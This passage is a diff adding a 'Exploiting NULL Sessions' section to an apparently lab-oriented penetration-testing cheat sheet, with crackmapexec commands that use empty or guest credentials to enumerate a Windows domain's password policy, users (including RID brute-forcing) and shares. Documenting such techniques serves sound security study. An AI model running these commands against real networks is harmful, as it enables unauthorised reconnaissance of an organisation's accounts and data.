@@ -32,6 +32,47 @@ $ cat relaylistOutputFilename.txt
 192.168.1.117
 ```
 
+# Exploiting NULL Sessions
+
+A [NULL Session](https://en.wikipedia.org/wiki/Null_session) is an anonymous connection to an inter-process communication network service on Windows-based computers. The service is designed to allow named pipe connections but may be used by attackers to gather information about the system remotely.
+
+When a target is vulnerable to a `NULL Session`, especially a domain controller, it will allow the attacker to gather information without having a valid domain account, such as:
+
+- Domain users (`--users`)
+- Domain groups (`--groups`)
+- Password policy (`--pass-pol`)
+- Share folders (`--shares`)
+
+## Password Policy
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
+```
+
+## Enumerating Users
+
+```bash
+$ crackmapexec smb 10.129.203.121  -u '' -p '' --users
+```
+
+## Enumerating Users with rid bruteforce
+
+The `--rid-brute` option can be used to determine the users of a domain. This option is particularly useful when dealing with a domain that has NULL Authentication but has certain query restrictions.
+
+```bash
+$ crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
+```
+
+## Enumerating Shares
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u '' -p '' --shares
+```
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u guest -p '' --shares
+```
+
 
 # Searching Account in GPO
 
